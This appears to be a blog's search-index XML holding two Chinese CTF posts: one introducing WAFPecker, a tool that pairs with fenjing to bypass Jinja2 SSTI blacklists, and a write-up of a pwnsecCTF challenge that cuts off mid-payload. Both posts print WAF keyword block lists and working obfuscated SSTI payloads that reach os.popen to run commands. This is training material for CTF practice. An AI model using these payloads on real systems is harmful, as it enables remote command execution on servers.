<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WAFPecker</title>
    <link href="/2024/12/20/WAFPecker/"/>
    <url>/2024/12/20/WAFPecker/</url>
    
    <content type="html"><![CDATA[<h1 id="WAFPecker-一款配合fenjing的SSTI-WAF-Bypass工具"><a href="#WAFPecker-一款配合fenjing的SSTI-WAF-Bypass工具" class="headerlink" title="WAFPecker- 一款配合fenjing的SSTI-WAF-Bypass工具"></a>WAFPecker- 一款配合fenjing的SSTI-WAF-Bypass工具</h1><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241743587.png" alt="image-20241221225512129"></p><blockquote><p><strong>GitHub 项目地址: [WAFPecker](<a href="https://github.com/YZS17/WAFPecker">YZS17&#x2F;WAFPecker: A tool for bypassing SSTI-WAF used in CTF in conjunction with fenjing. (github.com)</a>)</strong></p></blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>一款在<code>CTF</code>中配合<code>fenjing</code>使用的<code>SSTI WAF Bypass</code>工具</p><ul><li><p>作为一个正在学习<code>CTF</code>的小菜鸡，遇到题目能用工具一把嗦的时候，是能嗦则嗦，不想麻烦（<del>因为麻烦的题也不会<code>QAQ</code></del>），但是有些时候会因为一些不可抗拒的因素不能直接嗦题，需要本地调试，为了更好的**<del>嗦题</del>**学习，我写了这个工具。</p></li><li><p><code>SSTI</code>漏洞是<code>CTF</code>的<code>Web</code>方向常考的题型，在很多时候我们可以获取到源码，从而获取<code>WAF</code>的黑名单信息，需要我们根据黑名单来绕过，而<code>fenjing</code>不是所有时候都可以直接使用的，它需要根据回显来判断<code>payload</code>是否有效，但是难一些的题目经常会设计成无回显，这时候就需要我们修改源码，加上回显，再配合使用<code>fenjing</code>工具。（如2024长城杯的<code>Safe_proxy</code>,2024<code>pwnsecCTF</code>的<code>jinjia2 master</code>）</p></li><li><p><code>WAFPecker</code>就是为了解决这一类情况而编写的项目，直接输入<code>blacklist</code>，即可模拟<code>fenjing</code>可测试的环境，配合<code>fenjing</code>使用，快速生成有效<code>payload</code>。希望我的工具可以帮到您。</p></li><li><p>祝您好运！</p></li></ul></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs /your_project_directory">/WAFPecker    <br>    app.py       //run this file to use this tool<br>    __init__.py<br>    views.py<br>    waf.py   //POST,you can also change to GET<br>    blacklist.txt   //write your WAF blacklist in  this file.<br>    requirement.txt <br></code></pre></td></tr></table></figure><h4 id="详细使用步骤"><a href="#详细使用步骤" class="headerlink" title="详细使用步骤"></a>详细使用步骤</h4><ul><li><p>打开<code> blacklist.txt</code>文件, 按照下面的样式写入你的<code>WAF</code>黑名单 。</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-symbol">&#x27;setstate</span>&#x27;, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-symbol">&#x27;exec</span>&#x27;, <span class="hljs-symbol">&#x27;__builtins__</span>&#x27;, <span class="hljs-symbol">&#x27;template</span>&#x27;, <span class="hljs-symbol">&#x27;render</span>&#x27;, &#x27;\\&#x27;,<span class="hljs-symbol">&#x27;compile</span>&#x27;, <span class="hljs-symbol">&#x27;requests</span>&#x27;, <span class="hljs-symbol">&#x27;exit</span>&#x27;,  <span class="hljs-symbol">&#x27;pickle</span>&#x27;,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>]<br></code></pre></td></tr></table></figure></li><li><p><code>Python app.py</code>  在终端中运行<code>app.py</code>文件 </p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241743670.png" alt="image-20241221223751030"></p></li><li><p>打开地址<code> http://127.0.0.1:5000</code>，浏览器显示以下页面，就是环境已经部署完毕。</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241743610.png" alt="image-20241221224045869"></p><h4 id="配合fenjing使用"><a href="#配合fenjing使用" class="headerlink" title="配合fenjing使用"></a>配合fenjing使用</h4></li><li><p>在终端中输入<code>fenjing webui</code>，运行<code>fenjing</code></p></li><li><p>请求方式填写<code>POST</code>,完成相关信息填写后，点击开始分析，等待右边显示<code>WAF</code>已绕过。就可以获得相关命令的<code>payload</code>了。</p></li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241743537.png" alt="image-20241221223237433"></p><ul><li>这样我们就获得了可以绕过当前<code>blacklist-WAF</code>的<code>payload</code></li></ul><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&#123;%set iq=&#x27;so&#x27;[::-1]%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.next</span>[&#x27;__g&#x27;&#x27;lobals__&#x27;][&#x27;_&#x27;&#x27;_builtins__&#x27;].__import__(<span class="hljs-name">iq</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>后续有时间的活会出一期使用<code>WAFPecker</code>解决2024长城杯和2024<code>PwnsecCTF</code>的<code>SSTI</code>题目的文章，和大家一起学习，不足之处，请多多指正，谢谢大家！</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI-fenjing-思路总结</title>
    <link href="/2024/12/20/SSTI-fenjing-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
    <url>/2024/12/20/SSTI-fenjing-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI-fenjing-思路总结"><a href="#SSTI-fenjing-思路总结" class="headerlink" title="SSTI-fenjing-思路总结"></a>SSTI-fenjing-思路总结</h1><h3 id="2024-pwnsecCTF-jinjia2-master"><a href="#2024-pwnsecCTF-jinjia2-master" class="headerlink" title="2024-pwnsecCTF-jinjia2 master"></a>2024-pwnsecCTF-jinjia2 master</h3><ul><li>SSTI模版注入，app.py源码如下</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><span class="hljs-keyword">import</span> html<br><br>app = Flask(__name__)<br><br>BLACKLIST = [<br>    <span class="hljs-string">&#x27;init&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;TemplateReference&#x27;</span>,<br>    <span class="hljs-string">&#x27;cycler&#x27;</span>,<span class="hljs-string">&#x27;joiner&#x27;</span>,<span class="hljs-string">&#x27;namespace&#x27;</span>,<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;for&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;flashed&#x27;</span>,<span class="hljs-string">&#x27;range&#x27;</span>,<span class="hljs-string">&#x27;class&#x27;</span>,<span class="hljs-string">&#x27;mro&#x27;</span>,<br>    <span class="hljs-string">&#x27;subclasses&#x27;</span>,<span class="hljs-string">&#x27;pyfile&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-string">&#x27;stdout&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;if&#x27;</span>,<span class="hljs-string">&#x27;module&#x27;</span>,<span class="hljs-string">&#x27;RUNCMD&#x27;</span>,<span class="hljs-string">&#x27;format&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;values&#x27;</span>,<span class="hljs-string">&#x27;form&#x27;</span>,<br>    <span class="hljs-string">&#x27;cookies&#x27;</span>,<span class="hljs-string">&#x27;headers&#x27;</span>,<span class="hljs-string">&#x27;pragma&#x27;</span>,<span class="hljs-string">&#x27;mimetype&#x27;</span>,<span class="hljs-string">&#x27;origin&#x27;</span>,<span class="hljs-string">&#x27;referrer&#x27;</span>,<span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;attr&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>,<span class="hljs-string">&#x27;free&#x27;</span>,<span class="hljs-string">&#x27;palestine&#x27;</span>,<span class="hljs-string">&#x27;with&#x27;</span><br>]<br><br>BLACKLIST += [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>]<br><br>BLACKLIST += [<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    c = request.form.get(<span class="hljs-string">&#x27;c&#x27;</span>) <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    error_message = <span class="hljs-literal">None</span><br>    rendered_template = <span class="hljs-literal">None</span><br>    <br>    <span class="hljs-keyword">if</span> c:<br>        c = c.lower()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> BLACKLIST:<br>            <span class="hljs-keyword">if</span> item <span class="hljs-keyword">in</span> c:<br>                error_message = <span class="hljs-string">&quot;Invalid input detected!&quot;</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            rendered_template = html.unescape(render_template_string(c))<br>            <span class="hljs-comment"># can you?</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;fr3e_p4le$t1ne&amp;!&quot;</span> <span class="hljs-keyword">in</span> rendered_template:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> flag_file:<br>                        flag = flag_file.read()<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span><br>                <span class="hljs-keyword">except</span> FileNotFoundError:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Flag file not found!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Jinja-Master&lt;/title&gt;</span><br><span class="hljs-string">    &lt;style&gt;</span><br><span class="hljs-string">        @import url(&#x27;https://fonts.googleapis.com/css2?family=VT323&amp;display=swap&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        body &#123;</span><br><span class="hljs-string">            display: flex;</span><br><span class="hljs-string">            justify-content: center;</span><br><span class="hljs-string">            align-items: center;</span><br><span class="hljs-string">            height: 100vh;</span><br><span class="hljs-string">            margin: 0;</span><br><span class="hljs-string">            background-image: url(&#x27;/static/image.jpg&#x27;);</span><br><span class="hljs-string">            background-size: cover;</span><br><span class="hljs-string">            background-position: center;</span><br><span class="hljs-string">            font-family: &#x27;VT323&#x27;, monospace;</span><br><span class="hljs-string">            color: #33FF33;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container &#123;</span><br><span class="hljs-string">            background-color: rgba(0, 0, 0, 0.7);</span><br><span class="hljs-string">            padding: 20px;</span><br><span class="hljs-string">            border-radius: 10px;</span><br><span class="hljs-string">            box-shadow: 0px 0px 15px 5px rgba(0, 255, 0, 0.5);</span><br><span class="hljs-string">            max-width: 400px; </span><br><span class="hljs-string">            width: 100%; </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container input[type=&quot;text&quot;] &#123;</span><br><span class="hljs-string">            width: 100%;</span><br><span class="hljs-string">            padding: 10px;</span><br><span class="hljs-string">            margin: 10px 0;</span><br><span class="hljs-string">            border: 2px solid #33FF33;</span><br><span class="hljs-string">            border-radius: 5px;</span><br><span class="hljs-string">            background-color: #000;</span><br><span class="hljs-string">            color: #33FF33;</span><br><span class="hljs-string">            font-size: 18px;</span><br><span class="hljs-string">            box-sizing: border-box; </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container input[type=&quot;submit&quot;] &#123;</span><br><span class="hljs-string">            width: 100%;</span><br><span class="hljs-string">            padding: 10px;</span><br><span class="hljs-string">            background-color: #33FF33;</span><br><span class="hljs-string">            border: none;</span><br><span class="hljs-string">            border-radius: 5px;</span><br><span class="hljs-string">            color: #000;</span><br><span class="hljs-string">            font-size: 18px;</span><br><span class="hljs-string">            cursor: pointer;</span><br><span class="hljs-string">            transition: background-color 0.3s ease;</span><br><span class="hljs-string">            box-sizing: border-box; </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container input[type=&quot;submit&quot;]:hover &#123;</span><br><span class="hljs-string">            background-color: #00FF00;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .result, .error &#123;</span><br><span class="hljs-string">            margin-top: 20px;</span><br><span class="hljs-string">            padding: 10px;</span><br><span class="hljs-string">            border: 2px solid #33FF33;</span><br><span class="hljs-string">            border-radius: 5px;</span><br><span class="hljs-string">            background-color: #000;</span><br><span class="hljs-string">            color: #33FF33;</span><br><span class="hljs-string">            font-size: 18px;</span><br><span class="hljs-string">            text-align: center;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &lt;/style&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;form-container&quot;&gt;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            Enter template string: &lt;input type=&quot;text&quot; name=&quot;c&quot;&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        </span><br><span class="hljs-string">        &lt;div class=&quot;result&quot;&gt;&#123;&#123; rendered_template &#125;&#125;&#123;&#123; error_message &#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">        </span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&quot;&#123;&#123; error_message &#125;&#125;&quot;</span>, error_message <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#123;&#123; rendered_template &#125;&#125;&quot;</span>, rendered_template <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>题目无回显，需要修改源码，本地调试</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">.replace(<span class="hljs-string">&quot;&#123;&#123; rendered_template &#125;&#125;&quot;</span>, rendered_template <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#123;% if error_message %&#125;&quot;</span>, error_message <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;&lt;div class=&#x27;error&#x27;&gt;&quot;</span> + error_message + <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python -m flask <span class="hljs-built_in">run</span> <span class="hljs-attribute">--host</span>=0.0.0.0 <span class="hljs-attribute">--port</span>=1520<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200027251.png" alt="img"> </p><ul><li>fenjing一把嗦</li></ul><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">python</span> -<span class="hljs-string">m</span> <span class="hljs-string">fenjing</span> <span class="hljs-string">scan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://127.0.0.1:1520&quot;</span> <span class="hljs-built_in">--extra-data</span> <span class="hljs-string">&quot;c=1&quot;</span><br></code></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">c=&#123;%<span class="hljs-built_in">set</span> at=<span class="hljs-built_in">dict</span>(rtta=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> xq=<span class="hljs-built_in">dict</span>(so=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> re=<span class="hljs-built_in">dict</span>(daer=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> yd=<span class="hljs-built_in">dict</span>(a=x,b=x,c=x)|length%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span>=<span class="hljs-built_in">dict</span>(tini=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> ii=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+<span class="hljs-keyword">in</span>+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> gl=<span class="hljs-built_in">dict</span>(slabolg=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> go=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+gl+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> ge=<span class="hljs-built_in">dict</span>(metiteg=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> gi=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+ge+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> bu=<span class="hljs-built_in">dict</span>(snitliub=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> bl=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+bu+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> im=<span class="hljs-built_in">dict</span>(tropmi=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> ip=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+im+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> yt=<span class="hljs-built_in">dict</span>(aaaaa=x)|first|length%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> ob=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lb=ob**ob%&#125;&#123;%<span class="hljs-built_in">set</span> llb=(lb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllb=(llb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llllb=(lllb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> bb=llb-lb-lb-lb-lb-lb%&#125;&#123;%<span class="hljs-built_in">set</span> sbb=lllb-llb-llb-llb-llb-llb%&#125;&#123;%<span class="hljs-built_in">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> ob=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lb=ob**ob%&#125;&#123;%<span class="hljs-built_in">set</span> llb=(lb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllb=(llb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llllb=(lllb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> bb=llb-lb-lb-lb-lb-lb%&#125;&#123;%<span class="hljs-built_in">set</span> sbb=lllb-llb-llb-llb-llb-llb%&#125;&#123;%<span class="hljs-built_in">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> pw=yd+la%&#125;&#123;%<span class="hljs-built_in">set</span> iw=&#123;&#125;|escape|<span class="hljs-built_in">list</span>|escape|count%&#125;&#123;%<span class="hljs-built_in">set</span> et=iw+lla%&#125;&#123;%<span class="hljs-built_in">set</span> po=((&#123;&#125;|escape|urlencode|first+<span class="hljs-built_in">dict</span>(c=x)|join)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)%&#125;&#123;%<span class="hljs-built_in">set</span> ls=((&#123;&#125;|escape|urlencode|first+<span class="hljs-built_in">dict</span>(c=x)|join)*(yd+la))%(sbb+et+lla+pw,llla+pw,iw+bb,et+bb+pw)%&#125;&#123;%<span class="hljs-built_in">print</span> (((((((((((x,)|<span class="hljs-built_in">map</span>(at,ii)|first,)|<span class="hljs-built_in">map</span>(at,go)|first,)|<span class="hljs-built_in">map</span>(at,gi)|first)(bl),)|<span class="hljs-built_in">map</span>(at,gi)|first)(ip))(xq),)|<span class="hljs-built_in">map</span>(at,po)|first)(ls),)|<span class="hljs-built_in">map</span>(at,re)|first)()%&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag.txt<br></code></pre></td></tr></table></figure><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">c=</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> at=dict(rtta=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> xq=dict(so=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> re=dict(daer=x)<span 